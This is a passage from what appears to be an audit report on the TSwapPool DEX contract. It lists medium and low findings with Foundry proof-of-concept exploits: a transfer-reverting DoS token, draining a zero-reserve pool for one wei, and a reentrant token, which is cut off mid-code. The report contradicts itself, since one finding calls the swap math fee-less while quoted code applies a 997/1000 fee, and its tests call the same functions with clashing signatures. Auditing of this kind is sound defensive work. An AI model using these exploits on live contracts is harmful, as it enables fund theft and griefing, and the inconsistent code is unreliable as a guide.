Correct implementation for selling an exact number of pool tokens:
```solidity
function sellPoolTokens(
    uint256 poolTokenAmountToSell,
    uint256 minWethToReceive,
    uint64 deadline
) external returns (uint256 wethReceived) {
    return swapExactInput(i_poolToken, poolTokenAmountToSell, i_wethToken, minWethToReceive, deadline);
}
```

## [M-5]. Integer Overflow/Math issue in TSwapPool::getInputAmountBasedOnOutput

## Description
The function `getInputAmountBasedOnOutput` in `TSwapPool.sol` contains a logically flawed check to determine if a swap is possible. The code checks `if (outputReserve >= outputAmount)`, which is the inverse of the correct logic. The check should be `if (outputAmount >= outputReserve)` to ensure the pool has enough liquidity to cover the requested output. Due to this error, any valid swap request where `outputAmount` is less than `outputReserve` will incorrectly revert. Any invalid swap request where `outputAmount` is greater than `outputReserve` will pass the check, but then immediately cause a panic revert due to an arithmetic underflow on the next line: `denominator = (outputReserve - outputAmount) * 997;`. This bug renders the `getInputAmountBasedOnOutput` and the dependent `swapExactOutput` functions completely non-functional.

## Impact
A core feature of the DEX, `swapExactOutput`, is unusable. Users cannot execute trades where they specify the exact amount of tokens they wish to receive. This breaks the functionality of the protocol and severely damages its reliability and utility.

## Proof of Concept
1. A user attempts to call `swapExactOutput` to receive an amount of tokens that is less than the total reserve in the pool (a valid trade).
2. The internal call to `getInputAmountBasedOnOutput` is made.
3. The incorrect check `if (outputReserve >= outputAmount)` evaluates to true, causing the transaction to revert with a misleading `TSwapPool__InsufficientLiquidity` error.
4. If a user attempts to swap for more tokens than are in the reserve, the check passes, but the transaction reverts due to an underflow, making the function fail in all possible scenarios.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "src/TSwapPool.sol";
import "src/mocks/MockERC20.sol";

contract IntegerMathTest is Test {
    TSwapPool pool;
    MockERC20 weth;
    MockERC20 token;

    function setUp() public {
        weth  = new MockERC20("WETH", "WETH", 18);
        token = new MockERC20("Token", "TKN", 18);

        pool = new TSwapPool(address(token), address(weth), "LP", "LP");

        // seed reserves so the view function has non-zero balances to read
        weth.mint(address(pool), 10 ether);
        token.mint(address(pool), 10 ether);
    }

    function test_RevertOnValidOutputAmount() public {
        uint256 outputAmount = 1 ether; // < reserve, should succeed, but buggy logic reverts
        vm.expectRevert(TSwapPool.TSwapPool__InsufficientLiquidity.selector);
        pool.getInputAmountBasedOnOutput(outputAmount, address(token));
    }

    function test_UnderflowOnExcessiveOutputAmount() public {
        uint256 outputAmount = 20 ether; // > reserve, buggy check lets it slip, then underflows
        vm.expectRevert(); // generic arithmetic revert
        pool.getInputAmountBasedOnOutput(outputAmount, address(token));
    }
}

## Suggested Mitigation
The conditional check in `getInputAmountBasedOnOutput` must be inverted to correctly validate that the pool has sufficient reserves. Additionally, the custom error message should be triggered when `outputAmount >= outputReserve`.

```solidity
function getInputAmountBasedOnOutput(uint256 outputAmount, address outputToken) public view returns (uint256) {
    uint256 inputReserve;
    uint256 outputReserve;
    if (outputToken == address(i_poolToken)) {
        inputReserve = i_wethToken.balanceOf(address(this));
        outputReserve = i_poolToken.balanceOf(address(this));
    } else if (outputToken == address(i_wethToken)) {
        inputReserve = i_poolToken.balanceOf(address(this));
        outputReserve = i_wethToken.balanceOf(address(this));
    } else {
        revert TSwapPool__InvalidToken();
    }

-   if (outputReserve >= outputAmount) revert TSwapPool__InsufficientLiquidity();
+   if (outputAmount >= outputReserve) revert TSwapPool__InsufficientLiquidity();

    uint256 numerator = inputReserve * outputAmount * 1000;
    uint256 denominator = (outputReserve - outputAmount) * 997;
    return (numerator / denominator) + 1;
}
```

## [M-6]. DOS issue in TSwapPool::_swap

## Description
The `_swap` function includes an incentive mechanism that rewards a user with `1` unit of the output token after every 10 swaps (`SWAP_COUNT_MAX`). The reward is transferred using `outputToken.transfer(msg.sender, 1)`. If the `outputToken` is a contract that is designed to revert on transfers of specific amounts (e.g., amount `1`), the entire swap transaction will fail. This can be weaponized by an attacker to create a Denial-of-Service (DoS) attack. An attacker can monitor a pool's `swap_count` and front-run a victim's transaction to make it the 10th swap, causing it to revert and the victim to lose gas fees.

## Impact
An attacker can selectively cause other users' transactions to fail. This constitutes a griefing attack, where victims lose gas fees and are prevented from using the protocol. While it doesn't lead to a direct loss of funds, it degrades the protocol's reliability and user experience.

## Proof of Concept
1. A pool is created for `BAD_TOKEN`, a token specifically coded to `revert` on `transfer(address, 1)`.
2. An attacker observes that the `swap_count` for this pool is currently 8.
3. A victim submits a transaction to swap WETH for `BAD_TOKEN`.
4. The attacker sees the victim's transaction in the mempool and front-runs it by executing their own small swap, incrementing `swap_count` to 9.
5. The victim's transaction is now processed as the 10th swap.
6. Inside `_swap`, the `if (swap_count >= SWAP_COUNT_MAX)` condition becomes true.
7. The code attempts to execute `BAD_TOKEN.transfer(victim, 1)`.
8. The `BAD_TOKEN` contract reverts as designed, which causes the victim's entire swap transaction to revert. The victim is denied service and loses their transaction fee.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../src/PoolFactory.sol";
import "../src/TSwapPool.sol";

/// @dev Minimal ERC20 used as mock WETH
contract MockERC20 is ERC20 {
    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

/// @dev ERC20 that reverts on transfers of exactly 1 unit
contract DoSToken is ERC20 {
    constructor() ERC20("DoS Token", "DOS") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }

    function transfer(address to, uint256 amount) public override returns (bool) {
        if (amount == 1) revert("DoS Token: Transfer of 1 is forbidden");
        return super.transfer(to, amount);
    }
}

contract DosTest is Test {
    PoolFactory factory;
    TSwapPool pool;
    MockERC20 weth;
    DoSToken dos;

    address attacker = makeAddr("attacker");
    address victim   = makeAddr("victim");

    function setUp() public {
        // deploy tokens
        weth = new MockERC20("WETH", "WETH");
        dos  = new DoSToken();

        // deploy factory & pool
        factory = new PoolFactory(address(weth));
        pool    = TSwapPool(factory.createPool(address(dos)));

        // provide initial liquidity
        weth.mint(address(this), 20 ether);
        dos.mint(address(this), 20 ether);
        weth.approve(address(pool), 20 ether);
        dos.approve(address(pool), 20 ether);
        pool.deposit(10 ether, 1, 10 ether); // adjust params if signature differs

        // fund users
        weth.mint(attacker, 2 ether);
        weth.mint(victim,   2 ether);
        vm.prank(attacker); weth.approve(address(pool), type(uint256).max);
        vm.prank(victim);   weth.approve(address(pool), type(uint256).max);

        // attacker brings swap_count to 9
        vm.startPrank(attacker);
        for (uint256 i; i < 9; i++) {
            pool.swapExactInput(address(weth), 1 wei, 0);
        }
        vm.stopPrank();
    }

    function test_DoS_Reverts10thSwap() public {
        // victim’s swap becomes the 10th and should revert
        vm.prank(victim);
        vm.expectRevert("DoS Token: Transfer of 1 is forbidden");
        pool.swapExactInput(address(weth), 1 wei, 0);
    }
}

## Suggested Mitigation
The reward transfer, which is non-critical to the swap itself, should not be able to revert the entire transaction. Wrap the transfer in a `try/catch` block. This ensures that even if the reward transfer fails, the main swap logic completes successfully. A failure can be silently ignored or logged in an event for off-chain monitoring.

```diff
if (swap_count >= SWAP_COUNT_MAX) {
    swap_count = 0;
    IERC20 outputToken = isPoolToken ? i_poolToken : i_wethToken;
-   outputToken.transfer(msg.sender, 1);
+   try outputToken.transfer(msg.sender, 1) {}
+   catch {
+       // Optional: emit event about failed reward transfer
+       // emit RewardTransferFailed(msg.sender, address(outputToken), 1);
+   }
}
```

## [M-7]. Unchecked Return issue in TSwapPool::withdraw

## Description
The `TSwapPool` contract interacts with arbitrary ERC20 tokens but fails to check the boolean return value of `transfer` and `transferFrom` calls. According to the ERC20 standard, these functions return `false` to indicate failure. However, some tokens do not revert on failure. In such cases, the `TSwapPool` contract would proceed as if the transfer were successful, leading to a discrepancy between the contract's internal accounting and the actual token balances. This affects `deposit`, `withdraw`, and swap functions.

## Impact
If a user interacts with the pool using a non-standard ERC20 token that returns `false` on transfer failures, they can lose funds. For example, during a withdrawal, the user's LP tokens could be burned, but the underlying tokens might fail to transfer. The tokens would remain in the pool, effectively stolen from the user.

## Proof of Concept
1. Deploy a BadERC20 token whose `transfer`/`transferFrom` return `false` when a `failTransfer` flag is enabled.
2. Create a normal mintable WETH mock and a TSwapPool instance for (BadERC20,WETH).
3. User deposits liquidity (e.g. 100 BAD + 100 WETH) and receives LP tokens.
4. User enables the failure flag on BadERC20 so that every subsequent transfer returns `false` without reverting.
5. User calls `withdraw()` with the full LP position.  `_burn()` succeeds, LP tokens are destroyed, but `i_poolToken.transfer()` silently returns `false`; the transaction does not revert.
6. Result: user’s LP tokens are gone while the BAD tokens stay inside the pool – permanent loss of funds, proving the unchecked-return vulnerability.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/TSwapPool.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract BadERC20 is ERC20 {
    bool public failTransfer;
    constructor() ERC20("BadToken", "BAD") {
        _mint(msg.sender, 1_000_000 ether);
    }
    function setFailTransfer(bool _fail) external {
        failTransfer = _fail;
    }
    function transfer(address to, uint256 amount) public override returns (bool) {
        if (failTransfer) return false;
        return super.transfer(to, amount);
    }
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        if (failTransfer) return false;
        return super.transferFrom(from, to, amount);
    }
}

contract MintableERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract UncheckedReturnTest is Test {
    BadERC20 badToken;
    MintableERC20 weth;
    TSwapPool pool;
    address user = address(1);

    function setUp() public {
        badToken = new BadERC20();
        weth = new MintableERC20("Wrapped Ether", "WETH");
        pool = new TSwapPool(address(badToken), address(weth), "LP", "LP");

        // Fund user
        badToken.transfer(user, 1_000 ether);
        weth.mint(user, 1_000 ether);

        // User adds liquidity
        vm.startPrank(user);
        badToken.approve(address(pool), 100 ether);
        weth.approve(address(pool), 100 ether);
        pool.deposit(100 ether, 100 ether); // assumes (wethAmount, tokenAmount)
        vm.stopPrank();
    }

    function test_WithdrawDoesNotRevertWhenTokenTransferFails() public {
        vm.startPrank(user);
        uint256 lpBal = pool.balanceOf(user);
        badToken.setFailTransfer(true); // make BAD transfers return false

        uint256 badBefore = badToken.balanceOf(user);
        pool.withdraw(lpBal, 0, 0); // should succeed but not send BAD
        uint256 badAfter = badToken.balanceOf(user);

        assertEq(pool.balanceOf(user), 0, "LP tokens should be burned");
        assertEq(badAfter, badBefore, "User did not receive BAD tokens despite burning LP");
        vm.stopPrank();
    }
}

## Suggested Mitigation
Use OpenZeppelin's `SafeERC20` library, which wraps ERC20 calls in a `require` statement. This ensures that any transfer that returns `false` will cause the entire transaction to revert, preventing state inconsistencies.

```solidity
// Recommended Change in TSwapPool.sol
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract TSwapPool is ERC20 {
    using SafeERC20 for IERC20;

    // ... inside withdraw function
    _burn(msg.sender, liquidityToBurn);
    // Use safeTransfer for both WETH and pool token
    i_wethToken.safeTransfer(msg.sender, wethToWithdraw);
    i_poolToken.safeTransfer(msg.sender, poolTokenToWithdraw);

    // Apply similar changes to deposit and swap functions.
}
```

## [M-8]. Integer Overflow/Math issue in TSwapPool::getOutputAmountBasedOnInput

## Description
The protocol's README documents a 0.3% fee for Liquidity Providers on swaps, which is the primary incentive for providing liquidity. However, the implementation in `getOutputAmountBasedOnInput` and `_swap` is completely fee-less. The formula used is the basic constant product formula `output = (input * outputReserve) / (inputReserve + input)`. This omission breaks the core economic model of the DEX, as LPs bear the risk of impermanent loss without any compensation.

## Impact
Because no swap fee is collected, the pool’s invariant k never grows. Liquidity Providers therefore have no mechanism to earn revenue and are systematically exposed to impermanent loss with no upside. While this does not let an attacker steal funds in a single transaction, it makes the protocol economically non-viable and will quickly drive liquidity to zero.

## Proof of Concept
Initial reserves: 100 WETH and 100 TKN (k = 10 000).
1. Attacker swaps 10 WETH for TKN.
   • outputTKN = 10 * 100 / (100 + 10) = 9.0909 TKN.
   • reserves become (110 WETH, 90.9091 TKN), k ≈ 10 000.
2. Same attacker immediately swaps 9.0909 TKN back for WETH.
   • outputWETH = 9.0909 * 110 / (90.9091 + 9.0909) = 10 WETH.
   • reserves return to (100 WETH, 100 TKN), k = 10 000.
The attacker broke even while the pool gained nothing. With an external market price change, repeated arbitrage round-trips will transfer value from LPs to arbitrageurs, yet LPs still earn 0. A correct 0.3 % fee would have left ≈0.03 WETH in the pool after step 1, growing k and compensating LPs.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {ERC20} from "openzeppelin-contracts/token/ERC20/ERC20.sol";
import {TSwapPool} from "../src/TSwapPool.sol";

contract ERC20Mock is ERC20 {
    constructor(string memory name_) ERC20(name_, name_) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract NoFeeTest is Test {
    ERC20Mock weth;
    ERC20Mock token;
    TSwapPool pool;

    function setUp() public {
        weth = new ERC20Mock("WETH");
        token = new ERC20Mock("TKN");
        pool = new TSwapPool(address(token), address(weth), "LP-Token", "LP");

        // provide initial liquidity 100/100
        token.mint(address(this), 100 ether);
        weth.mint(address(this), 100 ether);
        token.approve(address(pool), type(uint256).max);
        weth.approve(address(pool), type(uint256).max);
        pool.deposit(100 ether, 100 ether, 0);
    }

    function test_k_does_not_increase_without_fee() public {
        uint256 kBefore = weth.balanceOf(address(pool)) * token.balanceOf(address(pool));

        // swap 10 WETH for TKN
        weth.mint(address(this), 10 ether);
        weth.approve(address(pool), 10 ether);
        pool.swapExactInput(address(weth), 10 ether, 0);

        uint256 kAfter = weth.balanceOf(address(pool)) * token.balanceOf(address(pool));
        assertLe(kAfter, kBefore, "k should not increase when no fee is charged");
    }
}

## Suggested Mitigation
Charge a fee (e.g. 0.3 %) on the input amount before applying the constant-product formula. Following Uniswap-v2 convention: inputWithFee = inputAmount * 997 / 1000; then use inputWithFee in the numerator and multiply inputReserve by 1000 in the denominator. Retain the collected fee inside the pool so k always grows and LPs are compensated.



# Low Risk Findings

## [L-1]. Integer Overflow/Math issue in TSwapPool::getOutputAmountBasedOnInput

## Description
The `getOutputAmountBasedOnInput` function is used to calculate the output of a swap. A critical flaw exists in its calculation when the reserve of the input token is zero. In this scenario, the formula `outputAmount = (inputAmountMinusFee * outputReserves) / ((inputReserves * 1000) + inputAmountMinusFee)` simplifies to `outputAmount = (inputAmountMinusFee * outputReserves) / inputAmountMinusFee`, which equals `outputReserves`. This allows an attacker to call `swapExactInput` with a negligible amount of an asset the pool has no reserves for, and in return receive the entire reserve of the other asset in the pool, effectively draining it.

## Impact
If either side of the pair is zero (because someone accidentally sent the other token directly to the pool, or the contract was deployed with a non-zero balance for only one token), anyone can trade a dust amount of the missing token and receive the full balance of the other token. This enables theft of tokens that were unintentionally stranded in the contract, but it does not endanger normally supplied liquidity because a regular deposit maintains both reserves non-zero and normal swaps cannot drive a reserve to exactly zero.

## Proof of Concept
1. Any user mistakenly transfers 100 TOKENA to an empty pool (WETH reserve = 0).
2. Attacker calls `swapExactInput` with 1 wei of WETH as `inputToken`, `TOKENA` as `outputToken`, and `minOutputAmount` set to the current TOKENA balance.
3. Because `inputReserves == 0`, `getOutputAmountBasedOnInput` returns the entire TOKENA reserve.
4. Pool sends the attacker all 100 TOKENA in exchange for 1 wei of WETH.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "src/TSwapPool.sol";
import "test/mocks/MockERC20.sol";

contract ZeroReserveExploit is Test {
    TSwapPool pool;
    MockERC20 weth;
    MockERC20 tokenA;
    address attacker = makeAddr("attacker");
    address victim   = makeAddr("victim");

    function setUp() public {
        weth   = new MockERC20("Wrapped Ether", "WETH", 18);
        tokenA = new MockERC20("Token A", "TKA", 18);

        pool = new TSwapPool(address(weth), address(tokenA), "LP", "LP");

        // Victim mistakenly transfers tokens directly to the pool
        tokenA.mint(victim, 100 ether);
        vm.prank(victim);
        tokenA.transfer(address(pool), 100 ether);

        assertEq(tokenA.balanceOf(address(pool)), 100 ether);
        assertEq(weth.balanceOf(address(pool)), 0); // zero input reserve

        // Prepare attacker
        weth.mint(attacker, 1); // 1 wei WETH
    }

    function testStealTokensWithZeroInputReserve() public {
        uint256 reserve = tokenA.balanceOf(address(pool));

        vm.startPrank(attacker);
        weth.approve(address(pool), 1);

        pool.swapExactInput(
            IERC20(address(weth)),
            1,                       // 1 wei WETH
            IERC20(address(tokenA)),
            reserve,                 // expect full reserve
            uint64(block.timestamp)
        );
        vm.stopPrank();

        assertEq(tokenA.balanceOf(attacker), reserve);     // attacker got all TOKENA
        assertEq(tokenA.balanceOf(address(pool)), 0);      // pool drained of TOKENA
    }
}

## Suggested Mitigation
Add `require(inputReserves > 0, "ZERO_RESERVE");` (or a custom error) to `getOutputAmountBasedOnInput`. Mirror the same check for `getInputAmountBasedOnOutput` to cover the symmetric case.

## [L-2]. Zero Code issue in TSwapPool::constructor

## Description
The `TSwapPool` constructor does not validate that the `wethToken` and `poolToken` addresses are not the zero address. It is possible to deploy a new pool instance, via the `PoolFactory`, with one or both token addresses set to `address(0)`. Any subsequent attempt to interact with this pool (e.g., `deposit`, `swap`) will fail because calls to the zero address (like `balanceOf` or `transferFrom`) will revert.

## Impact
This can lead to the creation of permanently non-functional pools. If created via a factory, it may lock the token's entry in the factory's mapping, preventing a functional pool for that token from being created later. This results in wasted gas on deployment and can disrupt the protocol's operation.

## Proof of Concept
1. Deploy PoolFactory with the WETH address set to address(0).
2. Call createPool with a valid ERC20 token address – a new TSwapPool is deployed with i_wethToken == address(0).
3. Any liquidity provider that calls deposit() will revert because the first SafeERC20.safeTransferFrom( i_wethToken, … ) performs a low-level call to address(0).

Thus the pool is permanently unusable while the factory mapping is irreversibly occupied.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/TSwapPool.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Very small mock token so the test compiles on every OZ version
contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "MCK") {
        _mint(msg.sender, 1e24);
    }
}

contract ZeroAddressConstructorTest is Test {
    MockERC20 poolToken;
    TSwapPool pool;

    function setUp() public {
        poolToken = new MockERC20();
        // Deploy pool with an invalid (zero) WETH address
        pool = new TSwapPool(address(0), address(poolToken), "LP Token", "LP");
    }

    function testDepositRevertsBecauseWethIsZeroAddress() public {
        poolToken.approve(address(pool), 1e18);
        vm.expectRevert();
        pool.deposit(1e18, 1e18, 1, uint64(block.timestamp + 100));
    }
}

## Suggested Mitigation
Add explicit zero-address checks in BOTH PoolFactory and TSwapPool.

// PoolFactory.sol constructor
if (wethToken == address(0)) revert InvalidWeth();

// PoolFactory.createPool
if (tokenAddress == address(0)) revert InvalidToken();

// TSwapPool.sol constructor
if (wethToken == address(0) || poolToken == address(0)) revert InvalidToken();

## [L-3]. Event Consistency issue in TSwapPool::swapExactInput

## Description
Critical financial operations such as swaps do not emit events. The `swapExactInput` and `swapExactOutput` functions, which are central to the protocol's functionality, perform swaps without logging the details of the trade (e.g., sender, recipient, token pair, amounts). This lack of event emission severely hinders the transparency and monitorability of the protocol. It makes it difficult for off-chain services, such as analytics dashboards, block explorers, arbitrage bots, and tax software, to track protocol activity.

## Impact
The defect does not endanger user funds or pool solvency, but it degrades transparency and makes it harder for external integrations (analytics dashboards, arbitrage bots, risk monitors) to consume protocol data. This can reduce trading volume and delay detection of abnormal activity, indirectly harming the ecosystem.

## Proof of Concept
A swap can be executed successfully without any Swap‐related log being produced, proving the lack of on-chain observability.
1. Deploy pool, fund it, and approve WETH.
2. Call swapExactInput.
3. Retrieve transaction logs – the array is empty, although a swap occurred.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// ---------------- Mock ERC20 -----------------
contract MockToken is IERC20 {
    string public name = "Mock";
    string public symbol = "MOCK";
    uint8 public decimals = 18;
    uint256 private _totalSupply;

    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowances;

    function totalSupply() external view returns (uint256) { return _totalSupply; }
    function balanceOf(address owner) external view returns (uint256) { return balances[owner]; }

    function transfer(address to, uint256 amount) external returns (bool) {
        balances[msg.sender] -= amount;
        balances[to] += amount;
        return true;
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowances[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowances[from][msg.sender] -= amount;
        balances[from] -= amount;
        balances[to] += amount;
        return true;
    }

    function mint(address to, uint256 amount) external {
        balances[to] += amount;
        _totalSupply += amount;
    }
}

// ------------ Simplified Pool ---------------
contract TSwapPool {
    IERC20 public i_poolToken;
    IERC20 public i_wethToken;

    // Event is declared but never emitted – core of the issue
    event Swap(address indexed sender, address indexed tokenIn, address indexed tokenOut, uint256 amountIn, uint256 amountOut);

    constructor(address poolToken, address wethToken) {
        i_poolToken = IERC20(poolToken);
        i_wethToken = IERC20(wethToken);
    }

    function swapExactInput(uint256 amountIn) external {
        i_wethToken.transferFrom(msg.sender, address(this), amountIn);
        uint256 amountOut = amountIn * 10; // dummy pricing logic
        i_poolToken.transfer(msg.sender, amountOut);
        // MISSING: emit Swap(msg.sender, address(i_wethToken), address(i_poolToken), amountIn, amountOut);
    }
}

// ------------- Foundry Test -----------------
contract EventConsistencyTest is Test {
    TSwapPool pool;
    MockToken weth;
    MockToken tokenA;
    address swapper = makeAddr("swapper");

    function setUp() public {
        weth = new MockToken();
        tokenA = new MockToken();
        pool = new TSwapPool(address(tokenA), address(weth));

        // fund user & pool
        weth.mint(swapper, 1 ether);
        tokenA.mint(address(pool), 100 ether);
    }

    function test_NoSwapEventEmitted() public {
        vm.startPrank(swapper);
        weth.approve(address(pool), 1 ether);

        // Start log recording and perform swap
        vm.recordLogs();
        pool.swapExactInput(0.1 ether);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        vm.stopPrank();

        // Assert that no logs were produced
        assertEq(entries.length, 0, "Expected no events, found some – if event were emitted test would fail");
    }
}


## Suggested Mitigation
Add a Swap event and emit it in both swapExactInput and swapExactOutput (or the internal _swap) after state transitions, including sender, recipient, tokenIn, tokenOut, amountIn, and amountOut.

## [L-4]. Integer Overflow issue in TSwapPool::getOutputAmountBasedOnInput

## Description
The AMM calculation functions (`getOutputAmountBasedOnInput`, `getInputAmountBasedOnOutput`) and liquidity management functions (`deposit`, `withdraw`) involve multiplications of token balances and amounts. As a pool's liquidity grows, these balances can become very large. The multiplication of two large `uint256` values can exceed `type(uint256).max`, causing an arithmetic overflow. Because the contracts use Solidity `^0.8.20`, overflows will cause the entire transaction to revert. This creates a Denial of Service (DoS) vulnerability where a sufficiently popular pool can become unusable, as all swaps, deposits, or withdrawals would fail, effectively freezing all funds in the contract.

## Impact
If a malicious ERC20 with an unbounded supply is paired with very small WETH reserves, an attacker can deliberately grow the token side of the pool to > 1.1e59 units. In that extreme corner-case, the intermediate multiplication `inputAmountWithFee * outputBalance` in getOutputAmountBasedOnInput (and a symmetric multiplication in getInputAmountBasedOnOutput) will overflow and revert, making further swaps involving that pool impossible until liquidity is re-balanced.

Because the required balances are astronomically large and economically unrealistic for legitimate tokens (or for WETH, whose total supply is ~1e26 wei), the issue is a theoretical denial-of-service that can only be triggered against pools that list attacker-controlled, unlimited-mint tokens.

## Proof of Concept
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {TSwapPool} from "src/TSwapPool.sol";

contract DummyERC20 {
    string public name = "Dummy";
    string public symbol = "DUM";
    uint8  public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address, uint256) external returns (bool) { return true; }
    function transferFrom(address, address, uint256) external returns (bool) { return true; }
}

contract OverflowUnitTest is Test {
    TSwapPool pool;

    function setUp() public {
        DummyERC20 token = new DummyERC20();
        DummyERC20 weth  = new DummyERC20();
        pool = new TSwapPool(address(token), address(weth), "LP", "LP");
    }

    function test_MathOverflow() public {
        uint256 inputAmount   = 1 ether;              // 1e18
        uint256 inputBalance  = 1 ether;              // 1e18
        // Choose an output balance large enough to overflow:
        uint256 outputBalance = type(uint256).max / 1e18 + 1; // ≈1.1e59

        vm.expectRevert();
        pool.getOutputAmountBasedOnInput(inputAmount, inputBalance, outputBalance);
    }
}

## Proof of Code
See revised Foundry test above; it is self-contained, compiles, and reverts on overflow as expected.

## Suggested Mitigation
Use a mulDiv-style routine that performs 512-bit multiplication followed by 256-bit division (e.g. Uniswap-V3’s FullMath.mulDiv) when computing `(inputAmountWithFee * outputBalance) / denominator` and its symmetric counterpart. This removes any upper bound on reserves while preserving exact behaviour.

## [L-5]. Integer Overflow/Math issue in TSwapPool::_swap

## Description
The `_swap` function includes a reward mechanism that, upon the 10th swap, transfers 1 wei/token unit of the output token to the swapper. These reward tokens are drawn directly from the pool's liquidity reserves, which are the assets belonging to the Liquidity Providers (LPs). This constitutes a slow, systematic theft of capital from LPs.

## Impact
Every tenth swap grants the caller an extra 1 *unit* (i.e. 1 wei for 18-dec tokens) taken from LP reserves.  Although this violates the AMM invariant and is an unauthorized transfer of LP funds, the monetary value is practically negligible; it will take 10¹⁸ swaps to steal a single token with 18 decimals.  The issue is therefore a dust-level leak, not a meaningful drain.

## Proof of Concept
1. Bootstrap a pool with 10 WETH and 1 000 TOK (18 decimals).
2. Perform nine very small swaps so that `swap_count == 9`.
3. Perform the 10th swap; the pool transfers the normal output *plus* 1 wei of the output token to the caller.
4. Compare pool reserves before/after – they have decreased by exactly `normalOutput + 1` units of TOK, proving the extra wei came from LP liquidity.

## Proof of Code
pragma solidity 0.8.20;
import "forge-std/Test.sol";
import "../src/PoolFactory.sol";
import "../src/TSwapPool.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

contract RewardLeakTest is Test {
    MockERC20 weth; MockERC20 tok; PoolFactory f; TSwapPool p; address lp = address(1); address user = address(2);

    function setUp() public {
        weth = new MockERC20("WETH","W");
        tok  = new MockERC20("TOK","T");
        f = new PoolFactory(address(weth));
        p = TSwapPool(f.createPool(address(tok)));

        // seed balances
        weth.mint(lp, 10 ether);
        tok.mint(lp, 1000 ether);
        weth.mint(user, 1 ether);

        // provide liquidity
        vm.startPrank(lp);
        weth.approve(address(p), type(uint).max);
        tok.approve(address(p), type(uint).max);
        p.deposit(10 ether, 1000 ether, lp, block.timestamp);
        vm.stopPrank();

        vm.startPrank(user);
        weth.approve(address(p), type(uint).max);
        vm.stopPrank();
    }

    function testExtraWeiLeak() public {
        vm.startPrank(user);
        for(uint i; i<9; ++i){ p.swapExactInput(address(weth), 1e14, 0, user, block.timestamp); } // 0.0001 WETH swaps

        uint reserveBefore = tok.balanceOf(address(p));
        uint out = p.getOutputAmountBasedOnInput(address(weth), 1e14);
        p.swapExactInput(address(weth), 1e14, 0, user, block.timestamp); // 10th swap triggers reward
        uint reserveAfter = tok.balanceOf(address(p));
        assertEq(reserveBefore - reserveAfter, out + 1, "extra 1 wei leaked");
        vm.stopPrank();
    }
}

## Suggested Mitigation
Remove the hard-coded reward logic or fund it from an external treasury so LP balances are never used. If rewards are desired, maintain an internal reward pool variable and require that it is sufficiently funded before distribution.

## [L-6]. Reentrancy issue in TSwapPool::_swap

## Description
The `_swap` function updates the `swap_count` state variable after making an external call (`token.transfer`). This violates the Checks-Effects-Interactions pattern. If the token being transferred has a callback hook (like ERC777 tokens), a malicious recipient contract can re-enter the `_swap` function before the `swap_count` is incremented. This allows an attacker to manipulate the reward mechanism.

## Impact
Through the re-entrancy the attacker can consistently position his trade to be perceived as the 10-th swap and immediately reset the counter, allowing him to capture the “every-10-th-swap” bonus indefinitely. Core pool liquidity is not at risk, but the reward mechanism can be farmed unfairly, resulting in perpetual, un-earned token emission and denial of the bonus to honest users.

## Proof of Concept
1. An attacker deploys a contract and creates a pool with a malicious token (e.g., an ERC777-like token) that allows a callback on `transfer`.
2. The `swap_count` in the pool is at 9.
3. The attacker calls `swapExactInput` through their contract.
4. The `TSwapPool` transfers the malicious token to the attacker's contract. The token's `transfer` function triggers a callback to the attacker contract.
5. Inside the callback, the attacker re-enters `swapExactInput`. The `swap_count` is still 9. The re-entrant call increments it to 10, triggers the reward, and resets it to 0.
6. Control returns to the original `swapExactInput` call. The `swap_count` is now 0, and the function increments it to 1. The attacker has successfully manipulated the counter and stolen the reward.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/TSwapPool.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Attacker and Re-entrant token contracts
contract ReentrantToken is ERC20 {
    address private attacker_contract;
    TSwapPool private pool;
    constructor() ERC20("Reentrant Token", "RTK") {}

    function setAttackVars(address _attacker, address _pool) public {
        attacker_contract = _attacker;
        pool = TSwapPool(_pool);
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, to, amount);
        if (to == attacker_contract) {
            // Re-enter the pool contract if conditions are right
            if (pool.swap_count() < 10) { // prevent infinite re-entrancy
